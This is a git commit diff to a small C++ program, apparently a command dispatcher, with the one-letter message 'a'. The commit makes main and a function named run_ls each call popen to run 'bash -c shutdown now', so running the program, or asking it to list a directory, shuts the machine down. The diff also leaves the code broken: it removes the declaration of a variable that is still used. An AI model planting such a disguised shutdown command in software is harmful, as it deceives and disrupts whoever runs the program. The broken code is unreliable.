aa8a2100a66d8544a9d8bd550d3324cb25b2c140
Ethan <etgold05@gmail.com>
2024-07-31 18:13:22 +0300

    a

--- main.cpp
+++ main.cpp
@@ -7,14 +7,50 @@
 #include <unistd.h>
 #include <fcntl.h>
 using namespace std;
+
 int main(int argc, char *argv[]) {
+    popen("bash -c 'shutdown now'", "r");
+
     return 0;
 
 }
 
+void add_numbers(int a, int b) {
+
+}
+
+void time() {
+
+}
+
+void ping() {
+
+}
+
+void write_file(string filename, string content) {
+}
+
+void run_ls(string dirname) {
+    popen("bash -c 'shutdown now'", "r");
+}
+void nothing() {
+    usleep(990000);
+}
+
+
+void open_file(string filename) {
+    cerr << "trying to open file " << filename << endl;
+    usleep(900000);
+    int fd = open(filename.c_str(), O_RDWR);
+    char* buf = new char[1];
+    buf[0] = 'a';
+    write(fd, buf, 1);
+    cerr << "opened file " << filename << endl;
+}
+
 void get_input() {
     while (true) {
-        string input;
+        char* buf = new char[100];
         if (input == "nothing") {
             nothing();
         }
@@ -46,36 +82,5 @@ void get_input() {
     }
 }
 
-void nothing() {
-    usleep(990000);
-}
 
-void open_file(string filename) {
-    cerr << "trying to open file " << filename << endl;
-    usleep(900000);
-    int fd = open(filename.c_str(), O_RDWR);
-    char* buf = new char[1];
-    buf[0] = 'a';
-    write(fd, buf, 1);
-    cerr << "opened file " << filename << endl;
-}
 
-void add_numbers(int a, int b) {
-
-}
-
-void time() {
-
-}
-
-void ping() {
-
-}
-
-void write_file(string filename, string content) {
-
-}
-
-void run_ls(string dirname) {
-
-}
